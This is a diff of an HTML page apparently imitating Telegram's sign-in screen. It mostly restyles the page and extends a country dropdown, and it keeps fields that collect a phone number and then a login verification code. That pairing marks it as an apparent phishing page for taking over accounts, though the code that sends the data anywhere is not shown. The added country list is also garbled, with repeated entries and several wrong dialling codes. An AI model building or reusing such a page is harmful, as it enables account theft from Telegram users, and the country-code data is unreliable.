@@ -5,42 +5,38 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign in to Telegram</title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap');
         body {
-            font-family: 'Helvetica Neue', Arial, sans-serif;
-            background-color: #ffffff; /* Ensure the background is white */
+            font-family: 'Open Sans', sans-serif;
+            background-color: #ffffff;
             margin: 0;
             padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            overflow: hidden; /* Prevent body overflow */
+            min-height: 100vh;
+            overflow-x: hidden;
         }
 
         .container {
-            background-color: #ffffff; /* Match the body background */
+            background-color: #ffffff;
             padding: 20px;
-            border-radius: 0; /* Remove border radius */
             text-align: center;
-            width: 100%;
-            max-width: 400px;
-            position: absolute; /* Position absolutely to control placement */
-            top: 10%; /* Adjust vertical position */
-            left: 50%;
-            transform: translateX(-50%);
-            height: calc(100vh - 20px); /* Fill most of the viewport height */
-            overflow-y: auto; /* Allow scrolling if needed */
+            width: 90%;
+            max-width: 380px;
+            margin-top: 20px;
         }
 
         .container img {
-            width: 60px;
+            width: 80px;
             margin-bottom: 20px;
         }
 
         h1 {
-            font-size: 20px;
+            font-size: 18px;
             color: #333333;
             margin-bottom: 10px;
+            font-weight: 600;
         }
 
         p {
@@ -61,7 +57,7 @@
             margin-bottom: 5px;
         }
 
-        select, input[type="text"], input[type="number"] {
+        select, input[type="tel"] {
             width: 100%;
             padding: 10px;
             border: 1px solid #ccc;
@@ -71,8 +67,22 @@
             margin-bottom: 10px;
         }
 
+        select {
+            background-color: #fff;
+            color: #333;
+            appearance: none;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            position: relative;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24"><path fill="none" stroke="%23666" stroke-width="2" d="M2 7 L12 17 L22 7"/></svg>');
+            background-repeat: no-repeat;
+            background-position: right 10px center;
+            background-size: 12px 12px;
+        }
+
         input[type="checkbox"] {
             margin-right: 10px;
+            vertical-align: middle;
         }
 
         .button {
@@ -85,6 +95,7 @@
             font-size: 16px;
             cursor: pointer;
             margin-top: 10px;
+            font-weight: 600;
         }
 
         .button:hover {
@@ -96,8 +107,32 @@
             margin-bottom: 20px;
         }
 
+        #countryCode {
+            color: #ccc;
+            text-align: left;
+        }
+
+        #countryCode option {
+            color: #333;
+        }
+
+        #countryCode:focus {
+            color: #333;
+        }
+
+        #countryCode option:first-child {
+            display: none;
+        }
+
         #verificationContainer, #finalMessageContainer {
             display: none;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                width: 95%;
+                max-width: 340px;
+            }
         }
     </style>
 </head>
@@ -110,26 +145,96 @@
         <div class="input-group">
             <label for="countryCode">Country</label>
             <select id="countryCode" onchange="updatePhoneNumberPrefix()">
-                <option value="+61" data-flag="🇦🇺">🇦🇺 Australia (+61)</option>
-                <option value="+1" data-flag="🇺🇸">🇺🇸 United States (+1)</option>
-                <option value="+44" data-flag="🇬🇧">🇬🇧 United Kingdom (+44)</option>
-                <option value="+49" data-flag="🇩🇪">🇩🇪 Germany (+49)</option>
-                <option value="+33" data-flag="🇫🇷">🇫🇷 France (+33)</option>
-                <option value="+81" data-flag="🇯🇵">🇯🇵 Japan (+81)</option>
-                <option value="+91" data-flag="🇮🇳">🇮🇳 India (+91)</option>
-                <option value="+86" data-flag="🇨🇳">🇨🇳 China (+86)</option>
-                <option value="+7" data-flag="🇷🇺">🇷🇺 Russia (+7)</option>
-                <option value="+82" data-flag="🇰🇷">🇰🇷 South Korea (+82)</option>
+    <option value="" disabled selected hidden>Select your country</option>
+    <option value="+1" data-flag="🇺🇸">United States</option>
+    <option value="+44" data-flag="🇬🇧">United Kingdom</option>
+    <option value="+61" data-flag="🇦🇺">Australia</option>
+    <option value="+49" data-flag="🇩🇪">Germany</option>
+    <option value="+33" data-flag="🇫🇷">France</option>
+    <option value="+81" data-flag="🇯🇵">Japan</option>
+    <option value="+91" data-flag="🇮🇳">India</option>
+    <option value="+86" data-flag="🇨🇳">China</option>
+    <option value="+7" data-flag="🇷🇺">Russia</option>
+    <option value="+82" data-flag="🇰🇷">South Korea</option>
+    <option value="+55" data-flag="🇧🇷">Brazil</option>
+    <option value="+27" data-flag="🇿🇦">South Africa</option>
+    <option value="+60" data-flag="🇲🇾">Malaysia</option>
+    <option value="+65" data-flag="🇸🇬">Singapore</option>
+    <option value="+34" data-flag="🇪🇸">Spain</option>
+    <option value="+39" data-flag="🇮🇹">Italy</option>
+    <option value="+52" data-flag="🇲🇽">Mexico</option>
+    <option value="+92" data-flag="🇵🇰">Pakistan</option>
+    <option value="+91" data-flag="🇮🇳">India</option>
+    <option value="+91" data-flag="🇮🇳">India</option>
+    <option value="+33" data-flag="🇫🇷">France</option>
+    <option value="+44" data-flag="🇬🇧">United Kingdom</option>
+    <option value="+1" data-flag="🇺🇸">United States</option>
+    <option value="+61" data-flag="🇦🇺">Australia</option>
+    <option value="+7" data-flag="🇷🇺">Russia</option>
+    <option value="+81" data-flag="🇯🇵">Japan</option>
+    <option value="+55" data-flag="🇧🇷">Brazil</option>
+    <option value="+49" data-flag="🇩🇪">Germany</option>
+    <option value="+34" data-flag="🇪🇸">Spain</option>
+    <option value="+82" data-flag="🇰🇷">South Korea</option>
+    <option value="+27" data-flag="🇿🇦">South Africa</option>
+    <option value="+60" data-flag="🇲🇾">Malaysia</option>
+    <option value="+65" data-flag="🇸🇬">Singapore</option>
+    <option value="+98" data-flag="🇮🇷">Iran</option>
+    <option value="+90" data-flag="🇹🇷">Turkey</option>
+    <option value="+34" data-flag="🇪🇸">Spain</option>
+    <option value="+31" data-flag="🇳🇱">Netherlands</option>
+    <option value="+32" data-flag="🇧🇪">Belgium</option>
+    <option value="+41" data-flag="🇨🇭">Switzerland</option>
+    <option value="+43" data-flag="🇦🇹">Austria</option>
+    <option value="+46" data-flag="🇸🇪">Sweden</option>
+    <option value="+47" data-flag="🇳🇴">Norway</option>
+    <option value="+48" data-flag="🇵🇱">Poland</option>
+    <option value="+54" data-flag="🇦🇷">Argentina</option>
+    <option value="+56" data-flag="🇨🇱">Chile</option>
+    <option value="+57" data-flag="🇨🇴">Colombia</option>
+    <option value="+58" data-flag="🇻🇪">Venezuela</option>
+    <option value="+60" data-flag="🇲🇾">Malaysia</option>
+    <option value="+63" data-flag="🇵🇭">Philippines</option>
+    <option value="+65" data-flag="🇸🇬">Singapore</option>
+    <option value="+66" data-flag="🇹🇭">Thailand</option>
+    <option value="+67" data-flag="🇲🇭">Marshall Islands</option>
+    <option value="+68" data-flag="🇲🇻">Maldives</option>
+    <option value="+80" data-flag="🇹🇲">Turkmenistan</option>
+    <option value="+81" data-flag="🇯🇵">Japan</option>
+    <option value="+82" data-flag="🇰🇷">South Korea</option>
+    <option value="+84" data-flag="🇻🇳">Vietnam</option>
+    <option value="+850" data-flag="🇰🇵">North Korea</option>
+    <option value="+852" data-flag="🇭🇰">Hong Kong</option>
+    <option value="+853" data-flag="🇲🇴">Macau</option>
+    <option value="+855" data-flag="🇲🇲">Myanmar</option>
+    <option value="+856" data-flag="🇱🇦">Laos</option>
+    <option value="+880" data-flag="🇧🇩">Bangladesh</option>
+    <option value="+886" data-flag="🇹🇼">Taiwan</option>
+    <option value="+960" data-flag="🇲🇻">Maldives</option>
+    <option value="+961" data-flag="🇱🇧">Lebanon</option>
+    <option value="+962" data-flag="🇯🇴">Jordan</option>
+    <option value="+963" data-flag="🇸🇾">Syria</option>
+    <option value="+964" data-flag="🇮🇶">Iraq</option>
+    <option value="+965" data-flag="🇰🇼">Kuwait</option>
+    <option value="+966" data-flag="🇸🇦">Saudi Arabia</option>
+    <option value="+967" data-flag="🇾🇪">Yemen</option>
+    <option value="+968" data-flag="🇴🇲">Oman</option>
+    <option value="+970" data-flag="🇵🇸">Palestine</option>
+    <option value="+971" data-flag="🇦🇪">United Arab Emirates</option>
+    <option value="+972" data-flag="🇮🇱">Israel</option>
+    <option value="+973" data-flag="🇧🇭">Bahrain</option>
+    <option value="+974" data-flag="🇶🇦">Qatar</option>
             </select>
         </div>
 
         <div class="input-group">
             <label for="phoneNumber">Phone Number</label>
-            <input type="text" id="phoneNumber" placeholder="Phone Number">
+            <input type="tel" id="phoneNumber" inputmode="numeric" pattern="[0-9]*" placeholder="Phone Number">
         </div>
 
         <div>
-            <input type="checkbox" id="keepSignedIn"> Keep me signed in
+            <input type="checkbox" id="keepSignedIn">
+            <label for="keepSignedIn">Keep me signed in</label>
         </div>
 
         <button class="button" onclick="goToVerificationPage()">Next</button>
@@ -142,7 +247,7 @@
 
         <div class="input-group">
             <label for="verificationCode">Code</label>
-            <input type="number" id="verificationCode" placeholder="Code">
+            <input type="tel" id="verificationCode" inputmode="numeric" pattern="[0-9]*" placeholder="Code">
         </div>
 
         <button class="button" onclick="submitVerification()">Submit</button>
